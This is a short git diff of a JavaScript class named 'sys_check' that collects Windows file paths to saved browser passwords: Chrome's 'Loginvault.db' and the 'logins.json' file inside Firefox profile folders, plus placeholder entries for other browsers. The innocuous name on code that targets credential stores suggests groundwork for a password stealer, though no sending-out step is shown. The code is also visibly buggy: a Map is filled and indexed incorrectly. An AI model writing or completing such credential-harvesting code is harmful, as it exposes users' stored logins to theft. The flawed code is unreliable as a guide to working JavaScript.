@@ -18,16 +18,17 @@ const local = process.env.LOCALAPPDATA,
 		"Profiles" 
 	);
 
+const FF_folder = new Map();
+
 module.exports = class sys_check {
 	constructor() {
-		for (const folder of p.normalize(fire_win)) {
-			module.exports = f = (() => {
-				fs.readdirSync(folder);
-			});
+		for (const folder of (fire_win)) {
+			let toadd = fs.readdirSync(folder);
+			FF_folder.set(toadd);
 		}
 		this.win32_validBrowsers = [
 			[/chrome/, `${p.normalize(chrome_win)}/Loginvault.db`],
-			[/firefox/, `${p.normalize(fire_win)}/${f[0]}/logins.json`],
+			[/firefox/, `${p.normalize(fire_win)}/${FF_folder[0]}/logins.json`],
 			[/internet explorer/, "internetExplorer path"],
 			[/edge/, "edge path" ],
 			[/etc/, "NOTE: Find a way to deep-scan for other browsers"]
